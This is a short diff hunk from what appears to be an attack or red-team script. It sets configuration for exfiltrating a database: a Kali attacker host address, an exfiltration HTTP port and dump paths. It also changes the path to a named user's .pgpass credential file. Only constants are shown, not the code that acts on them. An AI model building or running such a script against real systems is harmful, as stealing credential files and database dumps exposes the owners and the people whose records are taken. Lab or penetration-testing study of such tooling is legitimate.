@@ -18,7 +18,7 @@ KALI_HOST        = "10.10.0.2"
 EXFIL_HTTP_PORT  = 9002
 EXFIL_LOCAL_PATH = "/tmp/db_exfil.dump"   # written on kali
 
-PGPASS_PATH = "/home/john.stravidis/.pgpass"
+PGPASS_PATH = "/home/john.stravidis/projects/waystar-connect/.pgpass"
 DUMP_PATH   = "/tmp/db_dump.dump"          # assembled on workstation
 
 _sentinel_seq = 0
